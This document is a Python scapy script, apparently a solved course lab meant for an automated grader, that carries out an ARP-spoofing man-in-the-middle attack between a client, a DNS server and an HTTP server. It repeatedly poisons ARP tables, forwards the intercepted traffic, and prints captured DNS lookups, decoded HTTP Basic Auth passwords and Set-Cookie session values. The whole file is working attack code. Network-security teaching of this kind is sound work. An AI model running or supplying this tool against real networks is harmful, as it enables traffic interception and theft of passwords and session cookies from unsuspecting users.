from scapy.all import *

import argparse
import sys
import threading
import time
import re
import base64

_mac_cache = {}

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    cached = _mac_cache.get(IP)
    if cached:
        return cached
    
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
    ans = srp1(pkt, timeout=1, verbose=0, iface=conf.iface)

    if ans and ARP in ans:
        mac_addr = ans[ARP].hwsrc
    else:
        mac_addr = getmacbyip(IP)
    
    if mac_addr:
        _mac_cache[IP] = mac_addr
    return mac_addr

#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = ARP(op=2, pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet, verbose=0, iface=conf.iface)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    packet = ARP(op=2, pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet, verbose=0, count=3, iface=conf.iface)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
# NOTE: beware of output requirements!
# Example output:
# # this is a comment that will be ignored by the grader
# *hostname:somehost.com.
# *hostaddr:1.2.3.4
# *basicauth:password
# *cookie:Name=Value
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC

    if packet[Ether].src == attackerMAC:
        return
    
    if packet.haslayer(DNS):
        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
            qname = packet[DNSQR].qname.decode('utf-8')
            print(f"*hostname:{qname}")
            sys.stdout.flush()
        elif packet.haslayer(DNSRR) and packet[DNS].qr == 1:
            for i in range(packet[DNS].ancount):
                rr = packet[DNS].an[i]
                if rr.type == 1:
                    print(f"*hostaddr:{rr.rdata}")
                    sys.stdout.flush()
    
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')

        auth_match = re.search(r'Authorization: Basic (\S+)', payload)
        if auth_match:
            encoded_str = auth_match.group(1)
            try:
                decoded_bytes = base64.b64decode(encoded_str)
                decoded_str = decoded_bytes.decode('utf-8')
                if ":" in decoded_str:
                    password = decoded_str.split(":", 1)[1]
                    print(f"*basicauth:{password}")
                    sys.stdout.flush()
            except:
                pass
        
        cookie_match = re.search(r'Set-Cookie: ([^;\r\n]+)', payload)
        if cookie_match:
            cookie_val = cookie_match.group(1)
            print(f"*cookie:{cookie_val}")
            sys.stdout.flush()
    
    if packet.haslayer(IP):
        if packet[IP].dst == httpServerIP:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = httpServerMAC
            sendp(packet, iface=conf.iface, verbose=0)

        elif packet[IP].dst == dnsServerIP:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = dnsServerMAC
            sendp(packet, iface=conf.iface, verbose=0)

        elif packet[IP].dst == clientIP:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = clientMAC
            sendp(packet, iface=conf.iface, verbose=0)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor, 'store':0}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
